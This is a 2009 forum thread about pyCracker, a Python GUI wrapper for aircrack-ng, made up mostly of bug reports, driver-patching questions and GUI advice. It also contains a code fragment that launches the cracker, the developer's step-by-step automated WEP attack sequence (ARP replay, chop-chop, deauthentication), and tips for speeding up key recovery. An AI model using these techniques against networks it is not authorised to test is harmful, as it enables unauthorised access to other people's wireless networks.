				self.Cracker = Modules.Aircracker.cCracker(self, self.lstNetworks.GetItem(_selected, 1).GetText(), self.lstNetworks.GetItem(_selected, 14).GetText(), self.txtDesiredMacAddress.GetValue(), "wifi0", "ath0", path, self.lstNetworks.GetItem(_selected, 9).GetText(), self.lstNetworks.GetItem(_selected, 4).GetText())
				self.Cracker.Start()
				self.Network.DestroyAllInterfaces("ath")  # destroy all interfaces
				#self.Cracker.DestroyInterfaceRange(0, 3)  # destroy all regardless wether they exist or not
				self.Cracker.Monitor()
				self.Cracker.Dump()			              # start dumping packages
				self.btnStop.Enable(True)
		else:
			question = "There is already a cracker running, you must stop it before starting a new session, stop now?"
			dlg = wx.MessageDialog(self, question, "Warning: Cracker Running", wx.YES_NO | wx.ICON_QUESTION)
			result = dlg.ShowModal()
			if result == wx.ID_NO:
				pass
			elif result == wx.ID_YES:
				self.Cracker.Stop()
				self.btnStop.Enable(False)
		
	def onTmrGetNetworks(self, event):
		if self.Cracker.IsRunning() != "true":
			Modules.Functions.PopulateLstNetworks(self, "ath0")

Also, I've been testing the latest release. pyCracker seems to hang on deauth and never gets to airplay.  Airplay "flashes" in the term for a split second then dies.  I believe the reason it does this is because there are no clients to deauth and pyCracker is using only the deauth method of cracking, rather than frag attack or chop chop.

Once the other methods of attack are implemented I can test further.

---

### Post by norsk on 2009-02-22
Thanks can't wait to check this out.  Oh yeah and you might want to post a link to the google page on the front page of this thread so people will find that link sooner to post questions/bugs.

---

### Post by T3kG33k on 2009-02-27
I just want to say first and foremost that this is an impressive piece of software that you written here!=D>

I only have problem that I can't seem to lockdown and I've searched the entire thread and your Google Code page for a resolution but I have come up empty handed.  It's just due to fact that I haven't slept in 36 hours or I'm a putz.  Anyway here's the error that I'm sure that you've already seen.

Can't load image from file '/home/stigi/Development/Eclipse/pyCracker/Icons/Main.png': file does not exist.

I've installed all of the necessary packages.  Does the Python script need to be in a specific directory as well or just run with the sudo python pyCrack.py command?

---

### Post by T3kG33k on 2009-02-27
Alright.  So I was missing the wxglade python app so I installed it but I'm still receiving the same error.  I also Missed the rule for posting in your Google Code page.  My bad.  So far though this is really the main and probably the only issue except for the attacks are not available.  As in the "menu" is blank.

---

### Post by Sprut1 on 2009-02-28
> **tturrisi said:**
> Update the wiki.
On Setup page it says, "Patching Drivers
Also, to successfully inject packages...".
It should say, "to successfully inject **packets**...".

Thanks, done.

> **tturrisi said:**
> I suggest modifying this section TO ALLOW multiple instances of cracking the same wlan, spawned in a new terminal because airplay does have certain known issues injecting w/ madwifi drivers.  Often, running a second airplay process gets injecting going at the desired rate.

Also, I've been testing the latest release. pyCracker seems to hang on deauth and never gets to airplay.  Airplay "flashes" in the term for a split second then dies.  I believe the reason it does this is because there are no clients to deauth and pyCracker is using only the deauth method of cracking, rather than frag attack or chop chop.

Once the other methods of attack are implemented I can test further.

I have not yet experienced the problem you are describing, but pyCracker is supposed to spawn several aireplay processes. And if you have checked the source code/changelog all attacks have been implemented, but I have not had time to test them so I'm guessing it just isn't working. And as I said before there should not be any deauthing involved if there are 0 clients. I must test everything out myself to see what the problem is. Thanks for testing once again!

> **norsk said:**
> Thanks can't wait to check this out.  Oh yeah and you might want to post a link to the google page on the front page of this thread so people will find that link sooner to post questions/bugs.

Thanks, I totally forgot - it's there now!

> **T3kG33k said:**
> I just want to say first and foremost that this is an impressive piece of software that you written here!=D>

I only have problem that I can't seem to lockdown and I've searched the entire thread and your Google Code page for a resolution but I have come up empty handed.  It's just due to fact that I haven't slept in 36 hours or I'm a putz.  Anyway here's the error that I'm sure that you've already seen.

Can't load image from file '/home/stigi/Development/Eclipse/pyCracker/Icons/Main.png': file does not exist.

I've installed all of the necessary packages.  Does the Python script need to be in a specific directory as well or just run with the sudo python pyCrack.py command?

Thank you! This has been discussed earlier in the thread - you must be very sleepy ;)
The problem is that when I make the GUI in wxGlade it generated the code using absolute paths to the pictures used in the application. Prior to uploading I must change them to relative paths like "Icons/Main.png" - which I forgot. You can easily do this yourself opening the .py file in any text editor and changing "/home/stigi/Development/Eclipse/pyCracker/Icons/Main.png" to "Icons/Main.png", or wait for the next upload :)

> **T3kG33k said:**
> Alright.  So I was missing the wxglade python app so I installed it but I'm still receiving the same error.  I also Missed the rule for posting in your Google Code page.  My bad.  So far though this is really the main and probably the only issue except for the attacks are not available.  As in the "menu" is blank.

Nothing wrong in posting here, continue doing that! I'll be glad if issues are posted to the google code page as well. And concerning wxglade, you don't need that application to run pyCracker :)

---

I can see that a lot of people have downloaded pyCracker, this I appreciate! I do hope people are still interested and patient even though the development is moving extremely slow at the moment. Several issues has been discovered in the past weeks and there is a lot to do before I can call the application useful/steady. Thanks to everyone who have contributed so far!

---

### Post by T3kG33k on 2009-02-28
I have another query.  I currently have two wifi cards.  The first is an Intel 2915abg internal that works great!  The second card that I use for Wifi Auditing is a NetGear WG511T with an Atheros chipset.  The issue that I'm running into is two fold.  I can't switch between either one to use as a my main connection which in turn seems to keep pyCrack from using it as the monitoring card.  It seems that pyCrack wants to keep using the intel adapter by default.
If it possibly helps I'm running an Alienware 51m 766. (Don't worry.  I worked the bugs out of it :)

---

### Post by inuit-joe on 2009-03-01
2 things, 1. whats the deal with pacthing the drivers how/ why do i have to do it.
and 2 whats the command to start pycrack?

---

### Post by tturrisi on 2009-03-03
> **inuit-joe said:**
> 2 things, 1. whats the deal with pacthing the drivers how/ why do i have to do it.
and 2 whats the command to start pycrack?
The drivers need to be patched so as to support packet injection when in rfmon mode.  Without injects, the entire process would take days to complete.

~# python pyCracker.py

---

### Post by KIAaze on 2009-03-04
> **inuit-joe said:**
> 2 things, 1. whats the deal with pacthing the drivers how/ why do i have to do it.
and 2 whats the command to start pycrack?

_How to patch the drivers:_
[http://www.aircrack-ng.org/doku.php?id=install_drivers](http://www.aircrack-ng.org/doku.php?id=install_drivers)

This is actually the hardest part of wireless cracking, but you should find all the info you need on the [aircrack wiki]("http://www.aircrack-ng.org/doku.php"). :)

_Note about clientless attack:_
If you only have one PC + router and want to try out the clientless attack, I recommend connecting to the router with a cable to simulate a client and get the PRGA xor data by connecting/disconnecting the cable.
I wasted a lot of time because of this.
You should go for a standard attack first anyway. ^^

---

### Post by Vadi on 2009-03-04
"Can't load image from file '/home/stigi/Development/Eclipse/pyCracker/Icons/Main.png': file does not exist." when starting.

---

### Post by Vadi on 2009-03-04
I just get this error that I don't know what it means:

> 
[ New session ] 
18:47:44 | 1 | /Init | Loading completed in 0.97s 
18:47:44 | 2 | /Init | System: posix 
18:48:48 | 3 | /network-list | Retrieving networks... 
18:49:14 | 4 | /airmon-check |  
18:49:14 | 5 | /cracker | New cracker initialized on w-interface wifi0 AP: 00:21:7C:82:66:E1 
18:49:19 | 6 | /Read-Packets | Error: No such file or directory 
18:49:24 | 7 | /Read-Packets | Error: No such file or directory 
18:49:29 | 8 | /Read-Packets | Error: No such file or directory 
18:49:34 | 9 | /Read-Packets | Error: No such file or directory 
18:49:39 | 10 | /Read-Packets | Error: No such file or directory 
18:49:44 | 11 | /Read-Packets | Error: No such file or directory 
18:49:49 | 12 | /Read-Packets | Error: No such file or directory 
18:49:54 | 13 | /Read-Packets | Error: No such file or directory 
18:49:59 | 14 | /Read-Packets | Error: No such file or directory 
18:50:04 | 15 | /Read-Packets | Error: No such file or directory 
18:50:09 | 16 | /Read-Packets | Error: No such file or directory 
18:50:14 | 17 | /Read-Packets | Error: No such file or directory 
18:50:19 | 18 | /Read-Packets | Error: No such file or directory 
18:50:24 | 19 | /Read-Packets | Error: No such file or directory 
18:50:29 | 20 | /Read-Packets | Error: No such file or directory 
18:50:34 | 21 | /Read-Packets | Error: No such file or directory 
18:50:39 | 22 | /Read-Packets | Error: No such file or directory 
18:50:44 | 23 | /Read-Packets | Error: No such file or directory 

---

### Post by cmat on 2009-03-04
Don't use absolute locations when programming in wxPython (or anything).

```
MY_PATH = sys.path[0]

blah...blah...im a toolbar(self, some params, MY_PATH + "/res/icon.png")
```

That was off the top of my head but it should work. After you export from wxglade, change all the absolute paths.

---

### Post by Sprut1 on 2009-03-05
> **Vadi said:**
> "Can't load image from file '/home/stigi/Development/Eclipse/pyCracker/Icons/Main.png': file does not exist." when starting.

This has been discussed before, will upload new version now to fix this.

> **Vadi said:**
> I just get this error that I don't know what it means: [...]

The problem is with airmon-ng and I'm not aware of what's causing this, will look into it.

> **cmat said:**
> Don't use absolute locations when programming in wxPython (or anything).

```
MY_PATH = sys.path[0]

blah...blah...im a toolbar(self, some params, MY_PATH + "/res/icon.png")
```

That was off the top of my head but it should work. After you export from wxglade, change all the absolute paths.

wxGlade automatically use absolute paths, this is not something I 'ordered'. I must have exported from wxGlade at some point and forgotten to change paths to relative.

---

### Post by Sprut1 on 2009-03-05
Updated new version to google code which fixes this:

# Fixed the absolute path to pictures.
# PopulateLstPackets() will include the file its trying to open in its output this way I can see if its looking for the correct file. (The "File not found" bug when cracker is running).

Enormous updates, I know.

For the next releases what I'm thinking is rewriting/cleaning/optimizing code and making things that *are*; work. From what tturrisi told me it sounds like the whole new attack module isn't working, I won't update before it is, this means I need time to test it out myself (which lately has been hard). I bet that most bugs that are present at this moment is because of silly things I've done (which has been the case several times before). The main problem I've had lately is no time to code at all.

Thanks to everyone who have downloaded the code and tested it so far, bare with me!

---

### Post by Sprut1 on 2009-03-09
Okay here's the news:

I've had some time testing today and I've figured out whats causing most of the problems with the attacks. All issues are posted at 
[http://code.google.com/p/pycracker/issues/list](http://code.google.com/p/pycracker/issues/list)
if anyone wants to have a closer look. Basically this is what I found out:

- Deauthing is working like a charm
- Authenticate didn't work because it was executed missing the interface argument.
- ArpReplay didn't work because the aircracker class was passed wrong ESSID argument.
- Chopchop and fragmentation was executed correctly, but output was badly parsed and reported to GUI, they were not useful.

Everything will be fixed in next release.

---

### Post by cmat on 2009-03-09
That's a fantastic UI by the way. I'm going to study it since I'm currently making a front-end for a command line application.

---

### Post by Sprut1 on 2009-03-09
> **cmat said:**
> That's a fantastic UI by the way. I'm going to study it since I'm currently making a front-end for a command line application.

Thank you! Study the source as well then, it might be helpful concerning subprocessing :)

---

### Post by Vadi on 2009-03-09
I don't quite share of the opinion that the interface is fantastic (some cleanup could be involved, but it is good).

However it's best to study an HIG: [http://library.gnome.org/devel/hig-book/stable/](http://library.gnome.org/devel/hig-book/stable/)

---

### Post by Sprut1 on 2009-03-09
> **Vadi said:**
> I don't quite share of the opinion that the interface is fantastic (some cleanup could be involved, but it is good).

However it's best to study an HIG: [http://library.gnome.org/devel/hig-book/stable/](http://library.gnome.org/devel/hig-book/stable/)

Thank you for that information, bookmarked!

---

### Post by inuit-joe on 2009-03-12
I dwonloaded WXwidgets and it still comes up with the thing saying nothing named WX

help!

---

### Post by Sprut1 on 2009-03-13
> **inuit-joe said:**
> I dwonloaded WXwidgets and it still comes up with the thing saying nothing named WX

help!

Did you install the wxPython wrapper?

I think I'll migrate to QT...

---

### Post by Sprut1 on 2009-03-13
New version uploaded today, we have now reached 0.0.7.1-alpha. You can find it here: [http://code.google.com/p/pycracker/downloads/list](http://code.google.com/p/pycracker/downloads/list)

There are numerous updates in this release, key features from the changelog:

- Rewrote the Aircrack module
- Fixed when initializing a cracker; ESSID argument was wrong, and causing several errors.
- Stop button will now terminate all running processes spawned by pyCracker.
- Dictionaries when cracking WPA networks were implemented.
- pyCracker won't open 100 threads of aireplay-ng anymore, but complete one task before doing another.
- If wlanconfig is absent this will be reported and the 'Interfaces' tab is disabled.
+ many, many, many other updates.

# All attacks are now running automatically based on the progress. (Even interactive packet reply).

Attack process:
1. Test injection.
2. Authenticate
3. Arp replay
4. Fragmentation / chop chop
5.1. Generate packet
6. Inject generated packet
7. interactive packet reinjection
8. Deauth random station 15 times
9. try to crack key if IVs > IV count defined in settings

Everything seems to run fine, and I've tested just about everything, but I do expect bugs (they don't appear when I want them to). The number of downloads so far has been thrilling, I hope people continue to test pyCracker and report back issues / enhancements that could be made. Thank you.

---

### Post by Vadi on 2009-03-13
> **Sprut1 said:**
> I think I'll migrate to QT...

Gtk+ and a proper ubuntu package would be a much better choice ;)

---

### Post by Sprut1 on 2009-03-13
> **Vadi said:**
> Gtk+ and a proper ubuntu package would be a much better choice ;)

If only there were just 1 choice...

All I know is that creating a GUI using wxGlade is like building a house using chinese eating-sticks (don't know the word for that). All the sizers makes me dizzy.

---

### Post by Vadi on 2009-03-13
Here is my experience...

Glade 3 > Qt Designer > wxGlade

(yeah wxglade is last. not good at all. qt designer makes it easy to slap together something, but really hard to make a quality gui. glade is the better of all of them - has some issues, but still best one that I found)

---

### Post by Sprut1 on 2009-03-13
> **Vadi said:**
> Here is my experience...

Glade 3 > Qt Designer > wxGlade

(yeah wxglade is last. not good at all. qt designer makes it easy to slap together something, but really hard to make a quality gui. glade is the better of all of them - has some issues, but still best one that I found)

Thank you, I'll check out Glade3 right away :)

---

### Post by eviluncleal on 2009-03-15
Thanks for the great app, I hope the X-app is better posts dont bother you keep bangin away at it,   I do have a buggy problem though i keep getting a message that says:/dump   airdump=ng report not found:/home/norman/desktop/pyCracker-0.0.7.1-alpha :end message  pycraker fails this goes on and on for 600 lines or so, or so being the end of my patience this time 41 minutes  i have also posted on the googlebug site

---

### Post by inuit-joe on 2009-03-16
Sorry to hi-jack the forums but i really need help
[http://ubuntuforums.org/showthread.php?t=1094615]("http://ubuntuforums.org/showthread.php?t=1094615")
any help would be apreciated

---

### Post by Sprut1 on 2009-03-16
> **eviluncleal said:**
> Thanks for the great app, I hope the X-app is better posts dont bother you keep bangin away at it,   I do have a buggy problem though i keep getting a message that says:/dump   airdump=ng report not found:/home/norman/desktop/pyCracker-0.0.7.1-alpha :end message  pycraker fails this goes on and on for 600 lines or so, or so being the end of my patience this time 41 minutes  i have also posted on the googlebug site

Thank you for taking time to issue an issue report. What I have found out here is that sometimes when you hit the crack button (like starting airodump-ng in Terminal), no BSSID/Stations show up, when they don't airodump-ng won't create the .txt report which pyCracker is looking for - it's this file pyCracker is using to get the information printed under the "Packets" tab. I know this happens if you have one or more interfaces in managed mode as well as the one in monitor mode, this I can confirm concerning atheros cards. So try again using only 1 interface. The good news is that from the debug.txt and arp.txt reports Injection was working, chopchop was initiated, authentication worked, arp replay was started and it replied a huge amount of packets at an average of 500 pps. You have a good chance of making use of pyCracker.

pyCracker is supposed to automatically remove all other interfaces prior to starting a new cracker, but I know this sometimes is an issue, I have seen this myself. Normally I just start over and it works. In the next release I'll look into adding some delays to see if things are just happening to fast.

Edit: By the way, don't wait for 600+ lines, my experience is; if this happens just start over, nothing will change during those minutes. And also, look at the bottom of this page, here is the common problems with airodump-ng, which also confirms what I said.: [http://www.aircrack-ng.org/doku.php?id=airodump-ng](http://www.aircrack-ng.org/doku.php?id=airodump-ng)

> **inuit-joe said:**
> Sorry to hi-jack the forums but i really need help
[http://ubuntuforums.org/showthread.php?t=1094615]("http://ubuntuforums.org/showthread.php?t=1094615")
any help would be apreciated

You should be ;)

---

### Post by dazzler on 2009-04-01
Can someone give me some tips links on how to patch my bcm4311 driver, i'm trying to get pyCracker working on my Inspiron 1501 laptop.

Currently using jaunty if thats a problem.

Many thanks

---

### Post by dazzler on 2009-04-01
Please really want to try and get this going, can i use the guide here 

[http://hacking-library.com/forum/viewtopic.php?f=36&t=4&start=0&st=0&sk=t&sd=a]("http://hacking-library.com/forum/viewtopic.php?f=36&t=4&start=0&st=0&sk=t&sd=a")

But change the sources versions in the guide, will this bork jaunty?

---

### Post by Sprut1 on 2009-04-01
dazzler, you should try wiemans thread which is linked in the first post, or start a new thread in the wireless section, I'm not to sure you will get any help here. I for one can't help you.

---

### Post by dazzler on 2009-04-01
Sprut1 

I'm not scared of reading just everything in tutorials are based on older kernels just asking before i jumped in ;)

Anyway took the plunge and think ive injected the driver now but still cant get pyCracker working properly.

Heres some terminal activity

```
 sudo airmon-ng start wlan0 1


Interface	Chipset		Driver

wlan0		Broadcom 43xx	b43 - [phy0]
				(monitor mode enabled on mon3)
mon0		Broadcom 43xx	b43 - [phy0]
mon1		Broadcom 43xx	b43 - [phy0]
mon2		Broadcom 43xx	b43 - [phy0]

dazzler@dazzler-laptop:~$ cd pyCracker
dazzler@dazzler-laptop:~/pyCracker$ sudo python pyCracker.py
lo        no wireless extensions.

eth0      no wireless extensions.

wmaster0  no wireless extensions.

dazzler@dazzler-laptop:~/pyCracker$ sudo ifconfig wlan0 down
dazzler@dazzler-laptop:~/pyCracker$ sudo iwconfig wlan0 mode monitor
dazzler@dazzler-laptop:~/pyCracker$ sudo ifconfig wlan0 up
dazzler@dazzler-laptop:~/pyCracker$ sudo aireplay-ng -9 wlan0
23:29:22  Trying broadcast probe requests...
23:29:22  Injection is working!
23:29:23  Found 2 APs

```

Any tips

---

### Post by Sprut1 on 2009-04-02
@ dazzler

I have no idea what's going on as you didn't provide any useful information. What's the output of debug? What is actually going on? What worked? What didn't work?

---

### Post by dazzler on 2009-04-02
> **Sprut1 said:**
> @ dazzler

I have no idea what's going on as you didn't provide any useful information. What's the output of debug? What is actually going on? What worked? What didn't work?

Sorry Sprut1 appreciate the help, i posted the terminal log earlier using a bit of airmon to test if injection was working and as far as i can tell it is.

When i start pyCracker it says 'wlanconfig' is not installed, interfaces tab will be disabled.

I then cant switch from managed to monitor in said tab.

Terminal shows

```
lo        no wireless extensions.

eth0      no wireless extensions.

wmaster0  no wireless extensions.

/bin/sh: Syntax error: "(" unexpected
python: Fatal IO error 11 (Resource temporarily unavailable) on X server :0.0.
dazzler@dazzler-laptop:~/pyCracker$ 


```

```

[ New session ] 
11:06:20 | 1 | /Init | Loading completed in 0.81s 
11:06:20 | 2 | /Init | System: posix 
11:06:41 | 3 | /network-list | Retrieving networks... 
11:06:57 | 4 | /init | (u'00:11:50:EB:D0:A3', u'"Magpie"', u' 1', '/home/dazzler/pyCracker/Packages/01Apr2009-11:06:56', u'WEP') 
11:06:57 | 5 | /airmon-check |  
11:06:57 | 6 | /airmon-check |  
11:06:57 | 7 | /airmon-check | Found 3 processes that could cause trouble. 
11:06:57 | 8 | /airmon-check | If airodump-ng, aireplay-ng or airtun-ng stops working after 
11:06:57 | 9 | /airmon-check | a short period of time, you may want to kill (some of) them! 
11:06:57 | 10 | /airmon-check |  
11:06:57 | 11 | /airmon-check | PID\tName 
11:06:57 | 12 | /airmon-check | 2946	NetworkManager 
11:06:57 | 13 | /airmon-check | 2965	wpa_supplicant 
11:06:57 | 14 | /airmon-check | 3748	dhclient 
11:06:57 | 15 | /airmon-check | Process with PID 3748 (dhclient) is running on interface wlan0 
11:06:57 | 16 | /airmon-check |  
11:06:57 | 17 | /monitor | Interface	Chipset		Driver 
11:06:57 | 18 | /monitor | wlan0		Broadcom 43xx	b43 - [phy0] 
11:06:57 | 19 | /monitor | 				(monitor mode enabled on mon0) 
[ New session ] 
11:07:55 | 1 | /Init | Loading completed in 0.82s 
11:07:55 | 2 | /Init | System: posix 
11:09:22 | 3 | /networks | Couldn't find a valid interface, put one in managed mode. 
11:09:38 | 4 | /networks | Couldn't find a valid interface, put one in managed mode. 
11:09:40 | 5 | /networks | Couldn't find a valid interface, put one in managed mode. 
[ New session ] 
11:12:35 | 1 | /Init | Loading completed in 0.76s 
11:12:35 | 2 | /Init | System: posix 
11:12:46 | 3 | /networks | Couldn't find a valid interface, put one in managed mode. 
11:12:54 | 4 | /wlanconfig | Error creating interface 
11:13:10 | 5 | /networks | Couldn't find a valid interface, put one in managed mode. 
11:13:12 | 6 | /networks | Couldn't find a valid interface, put one in managed mode. 
11:14:55 | 7 | /networks | Couldn't find a valid interface, put one in managed mode. 
[ New session ] 
11:15:47 | 1 | /Init | Loading completed in 0.79s 
11:15:47 | 2 | /Init | System: posix 
11:15:51 | 3 | /networks | Couldn't find a valid interface, put one in managed mode. 
11:15:54 | 4 | /networks | Couldn't find a valid interface, put one in managed mode. 
[ New session ] 
11:27:34 | 1 | /Init | Loading completed in 0.78s 
11:27:34 | 2 | /Init | System: posix 
11:27:41 | 3 | /wlanconfig | Error creating interface 
[ New session ] 
11:39:02 | 1 | /Init | Loading completed in 0.82s 
11:39:02 | 2 | /Init | System: posix 
11:39:26 | 3 | /network-list | Retrieving networks... 
[ New session ] 
11:57:43 | 1 | /Init | Loading completed in 0.78s 
11:57:43 | 2 | /Init | System: posix 
11:59:04 | 3 | /wlanconfig | Error creating interface 
11:59:06 | 4 | /wlanconfig | Error creating interface 
[ New session ] 
19:48:40 | 1 | /Init | Loading completed in 0.85s 
19:48:40 | 2 | /Init | System: posix 
19:49:12 | 3 | /network-list | Retrieving networks... 
19:49:23 | 4 | /init | (u'00:11:50:EB:D0:A3', u'"Magpie"', u' 1', '/home/dazzler/pyCracker/Packages/01Apr2009-19:49:23', u'WEP') 
19:49:24 | 5 | /airmon-check |  
19:49:24 | 6 | /airmon-check |  
19:49:24 | 7 | /airmon-check | Found 3 processes that could cause trouble. 
19:49:24 | 8 | /airmon-check | If airodump-ng, aireplay-ng or airtun-ng stops working after 
19:49:24 | 9 | /airmon-check | a short period of time, you may want to kill (some of) them! 
19:49:24 | 10 | /airmon-check |  
19:49:24 | 11 | /airmon-check | PID\tName 
19:49:24 | 12 | /airmon-check | 2951	NetworkManager 
19:49:24 | 13 | /airmon-check | 2970	wpa_supplicant 
19:49:24 | 14 | /airmon-check | 3872	dhclient 
19:49:24 | 15 | /airmon-check | Process with PID 3872 (dhclient) is running on interface wlan0 
19:49:24 | 16 | /airmon-check |  
19:49:24 | 17 | /monitor | Interface	Chipset		Driver 
19:49:24 | 18 | /monitor | wlan0		Broadcom 43xx	b43 - [phy0] 
19:49:24 | 19 | /monitor | 				(monitor mode enabled on mon0) 
[ New session ] 
20:09:14 | 1 | /Init | Loading completed in 0.81s 
20:09:14 | 2 | /Init | System: posix 
[ New session ] 
22:10:22 | 1 | /Init | Loading completed in 0.82s 
22:10:22 | 2 | /Init | System: posix 
22:10:41 | 3 | /networks | Couldn't find a valid interface, put one in managed mode. 
[ New session ] 
22:15:45 | 1 | /Init | Loading completed in 0.82s 
22:15:45 | 2 | /Init | System: posix 
[ New session ] 
22:26:06 | 1 | /Init | Loading completed in 0.79s 
22:26:06 | 2 | /Init | System: posix 
[ New session ] 
22:28:35 | 1 | /Init | Loading completed in 0.78s 
22:28:35 | 2 | /Init | System: posix 
[ New session ] 
21:05:50 | 1 | /Init | Loading completed in 0.82s 
21:05:50 | 2 | /Init | System: posix 
[ New session ] 
21:42:30 | 1 | /Init | Loading completed in 0.85s 
21:42:30 | 2 | /Init | System: posix 
21:42:52 | 3 | /network-list | Retrieving networks... 
21:43:00 | 4 | /init | (u'00:1B:2F:45:F6:9A', u'"dazzler"', u' 1', '/home/dazzler/pyCracker/Packages/02Apr2009-21:42:59', u'WPA Version 1') 
21:43:00 | 5 | /airmon-check |  
21:43:00 | 6 | /airmon-check |  
21:43:00 | 7 | /airmon-check | Found 3 processes that could cause trouble. 
21:43:00 | 8 | /airmon-check | If airodump-ng, aireplay-ng or airtun-ng stops working after 
21:43:00 | 9 | /airmon-check | a short period of time, you may want to kill (some of) them! 
21:43:00 | 10 | /airmon-check |  
21:43:00 | 11 | /airmon-check | PID\tName 
21:43:00 | 12 | /airmon-check | 2895	NetworkManager 
21:43:00 | 13 | /airmon-check | 2914	wpa_supplicant 
21:43:00 | 14 | /airmon-check | 3709	dhclient 
21:43:00 | 15 | /airmon-check | Process with PID 3709 (dhclient) is running on interface wlan0 
21:43:00 | 16 | /airmon-check |  
21:43:00 | 17 | /monitor | Interface	Chipset		Driver 
21:43:00 | 18 | /monitor | wlan0		Broadcom 43xx	b43 - [phy0] 
21:43:00 | 19 | /monitor | 				(monitor mode enabled on mon0) 
[ New session ] 
21:45:05 | 1 | /Init | Loading completed in 0.8s 
21:45:05 | 2 | /Init | System: posix 
21:45:14 | 3 | /networks | Couldn't find a valid interface, put one in managed mode. 
21:45:34 | 4 | /networks | Couldn't find a valid interface, put one in managed mode. 
21:45:38 | 5 | /networks | Couldn't find a valid interface, put one in managed mode. 
21:45:42 | 6 | /networks | Couldn't find a valid interface, put one in managed mode. 
21:46:08 | 7 | /networks | Couldn't find a valid interface, put one in managed mode. 
```



GUI crashes to desktop when i click crack (my own network i may add)
Does that help?

---

### Post by Sprut1 on 2009-04-03
@ dazzler

Thank you! Thats exactly what I need. Seems like you replicated a bug already issued (Issue #12: [http://code.google.com/p/pycracker/issues/detail?id=12](http://code.google.com/p/pycracker/issues/detail?id=12)). This will be fixed in next release *I think*, I've not noticed this myself so I can't guarantee. Thank you for helping out with the development!

---

### Post by dazzler on 2009-04-03
No problem i'll look forward to the next release then :)

At least i can stop scratching my head now.

Don't suppose its got anything to do with jaunty using a different version of python does it.

---

### Post by markp1989 on 2009-04-03
i been waiting for a program like this for a while, i will test it as soon as i have access to my laptop :D 

thanks Markp1989

edit: under arch, i get an error saying "wlanconfig" is not installed.

---

### Post by dazzler on 2009-04-03
> **markp1989 said:**
> i been waiting for a program like this for a while, i will test it as soon as i have access to my laptop :D 

thanks Markp1989

edit: under arch, i get an error saying "wlanconfig" is not installed.

I had to install madwifi to stop getting that error

---

### Post by Sprut1 on 2009-04-04
> **markp1989 said:**
> i been waiting for a program like this for a while, i will test it as soon as i have access to my laptop :D 

thanks Markp1989

edit: under arch, i get an error saying "wlanconfig" is not installed.

This is not an error, simply you are missing wlanconfig which comes with madwifi drivers. If you don't have this program the "Interfaces" tab won't work, and you must set-up interfaces manually.

---

### Post by nebajoth on 2009-04-08
I really appreciate the sensible defaults and the tray icon that allows the program to be hidden away.  Its those kind of small details that make for a really nicely designed application.

Good work, my friend.

---

### Post by dazzler on 2009-04-08
Not to nag Sprut1, but do you have an update on a fix for the 'Fatal IO error 11 (Resource temporarily unavailable) on X server :0.0.' errors a few people are receiving.

Many thanks

---

### Post by Katipo1 on 2009-04-09
I have eeebuntu running on an EEEPC. I ran the script and it complained about 'wlanconfig' not being installed.  After a google search I ran 'sudo apt-get install madwifi-tools'.  Ran the script again and had a bit of a play.  All seemed to be going well.  Then I hit stop and exited the program.  Now I have no wlan connection at all and when I type 'ifconfig', WLAN0 doesnt show at all!!! Rebooting doesnt fix it.  How do I get it back???!!!

---

### Post by dazzler on 2009-04-09
> **Katipo1 said:**
> I have eeebuntu running on an EEEPC. I ran the script and it complained about 'wlanconfig' not being installed.  After a google search I ran 'sudo apt-get install madwifi-tools'.  Ran the script again and had a bit of a play.  All seemed to be going well.  Then I hit stop and exited the program.  Now I have no wlan connection at all and when I type 'ifconfig', WLAN0 doesnt show at all!!! Rebooting doesnt fix it.  How do I get it back???!!!

Same i also tried to get it to work on my eeepc701 running jaunty, i think it gets stuck in monitor mode after exiting the program and therefore cannot see the access points any more.

Not sure the cure i just did a reinstall as i had only installed it recently anyway.

---

### Post by tturrisi on 2009-04-10
> **Katipo1 said:**
> I have eeebuntu running on an EEEPC. I ran the script and it complained about 'wlanconfig' not being installed.  After a google search I ran 'sudo apt-get install madwifi-tools'.  Ran the script again and had a bit of a play.  All seemed to be going well.  Then I hit stop and exited the program.  Now I have no wlan connection at all and when I type 'ifconfig', WLAN0 doesnt show at all!!! Rebooting doesnt fix it.  How do I get it back???!!!

In a terminal:

wlanconfig ath0 destroy
wlanconfig ath0 create wlandev wifi0 wlanmode sta
ifconfig ath0 up
/etc/init.d/networking restart  #reconnect

---

### Post by Sprut1 on 2009-04-11
> **nebajoth said:**
> I really appreciate the sensible defaults and the tray icon that allows the program to be hidden away.  Its those kind of small details that make for a really nicely designed application.

Good work, my friend.

Thank you! :)

> **dazzler said:**
> Not to nag Sprut1, but do you have an update on a fix for the 'Fatal IO error 11 (Resource temporarily unavailable) on X server :0.0.' errors a few people are receiving.

Many thanks

I'm working on major GUI rewrites, porting it all to GTK+. I guess I could upload an fix for this, I'll look into it. Either way it will be fixed with the new release I'm working on, I guess sometime after Jaunty is released.

> **Katipo1 said:**
> I have eeebuntu running on an EEEPC. I ran the script and it complained about 'wlanconfig' not being installed.  After a google search I ran 'sudo apt-get install madwifi-tools'.  Ran the script again and had a bit of a play.  All seemed to be going well.  Then I hit stop and exited the program.  Now I have no wlan connection at all and when I type 'ifconfig', WLAN0 doesnt show at all!!! Rebooting doesnt fix it.  How do I get it back???!!!

> **dazzler said:**
> Same i also tried to get it to work on my eeepc701 running jaunty, i think it gets stuck in monitor mode after exiting the program and therefore cannot see the access points any more.

Not sure the cure i just did a reinstall as i had only installed it recently anyway.

> **tturrisi said:**
> In a terminal:

wlanconfig ath0 destroy
wlanconfig ath0 create wlandev wifi0 wlanmode sta
ifconfig ath0 up
/etc/init.d/networking restart  #reconnect

Thanks to tturrisi for explaining this for you. pyCracker doesn't revert any changes that was made on exit, I never claimed it did. I seriously doubt that any changes you as the user make using pyCracker will destroy your computer. Please read the documentation next time :)

Use the "Interfaces" tab to add and remove interfaces. If this don't work, please tell me or issue an issue report and I'll try to fix the problems.

Thank you all for testing pyCracker!

---

### Post by dazzler on 2009-04-11
Thanks for the post =D> appreciate it

---

### Post by dazzler on 2009-04-18
Out of interest how long does a typical attack take to gain the wep keys using pyCracker.

I've managed to get it working on my eeepc701 now, installed eeebuntu standard, rejigged it with madwifi drivers and everythings up and running.

Trouble is did a quick test on my router and it was saying like 29days or more for it to complete, obviously i declined at that point :o

---

### Post by KIAaze on 2009-04-18
I haven't tried out pycracker yet, but since it uses aircrack, I suppose it's pretty much the same:
Once you get a .xor file or once you captured an ARP request (not sure of the correct terms), it's cracked in about 5-10 minutes max. :)

Also, once you cracked it once, you can reuse specific files (like the .xor packet or the .cap files) and crack it quickly again.

The time to get the ARP request/xor packet depends on the traffic. The more traffic on the network, the faster it's cracked.
For your first tests, I recommend artificially generating an ARP request from another PC on the network by pinging some IP address (don't remember if it must be an existing IP or not). You may also disconnect/reconnect the PC from/to the network.


